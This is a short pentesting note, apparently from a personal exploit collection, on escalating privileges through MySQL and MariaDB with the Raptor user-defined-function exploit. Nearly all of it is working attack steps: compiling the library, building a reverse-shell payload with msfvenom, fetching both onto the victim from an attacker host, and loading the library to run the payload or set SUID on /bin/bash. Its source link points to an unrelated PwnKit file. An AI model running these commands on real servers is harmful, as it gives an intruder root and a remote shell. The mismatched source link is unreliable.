# Name & CVE No.
[Raptor User-Defined Function Dynamic Library 2](https://www.exploit-db.com/exploits/1518)

## Tested Versions
* 10.3.17-MariaDB
* 5.0.77 MySQL
* 5.7.30 MySQL


## Usage
```
On Attacker:
searchsploit -m 1518
mv 1518.c raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=80 -f elf > non_staged.elf

On Victim:
wget http://192.168.45.214/raptor_udf2.so
wget http://192.168.45.214/non_staged.elf

On MariaDB:
create database poc;
use poc;
create table foo(line blob);
insert into foo values(load_file('/home/mario/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('/home/mario/non_staged.elf');

On MySQL:
create database poc;
use poc;
create table foo(line blob);
insert into foo values(load_file('/var/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
#ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so' (errno: 0 /usr/lib/mysql/plugin/raptor_udf2.so: file too short)
\! cp /var/tmp/raptor_udf2.so /usr/lib/mysql/plugin/raptor_udf2.so
create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.01 sec)
select * from mysql.func;
select do_system('chmod +s /bin/bash');
```

## Source
https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c


